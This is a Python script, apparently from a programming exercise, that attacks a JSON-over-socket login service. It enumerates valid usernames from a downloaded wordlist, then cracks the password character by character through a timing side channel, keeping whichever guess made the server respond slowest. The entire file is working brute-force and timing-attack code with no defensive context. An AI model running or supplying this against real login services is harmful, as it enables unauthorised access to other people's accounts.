import os
import json
import requests
import time


def download_file(file_name, url):
    """Downloads the file in <url> to the current directory, and names it <file_name>"""
    with open(fr'{os.getcwd()}\{file_name}', 'w') as file:
        content = requests.get(url).text
        file.write(content)

    return


def find_username(socket_object, file_name):
    """Finds the correct username by attempting a login with a username from <file_name> until successful."""
    with open(fr'{os.getcwd()}\{file_name}', 'r') as file:
        content = file.read()
        usernames = content.split('\n')

    object_ = {
        "login": '',
        "password": ''
    }

    for username in usernames:
        object_["login"] = username
        socket_object.send(json.dumps(object_).encode())
        response = json.loads(socket_object.recv(1024).decode())
        if correct_login(response):
            return username

    return


def find_password(socket_object, username, starting_string, password_characters):
    """Finds a correct password by building a password from scratch. If part of a correct password is attempted,
    the server returns a unique response, so those characters are saved, and the process continues."""
    object_ = {
        "login": username,
        "password": ''
    }

    strings = []
    times = []

    for character in password_characters:
        new_string = starting_string
        new_string += character
        strings.append(new_string)
        object_["password"] = new_string
        start_time = time.time()
        socket_object.send(json.dumps(object_).encode())
        response = json.loads(socket_object.recv(1024).decode())
        end_time = time.time()
        times.append(end_time - start_time)

        if password_correct(response):
            return new_string

    next_string = strings[times.index(max(times))]
    return find_password(socket_object, username, next_string, password_characters)


def correct_login(response_dict):
    return True if 'password' in response_dict["result"] else False


def password_correct(response_dict):
    return True if 'success' in response_dict["result"] else False

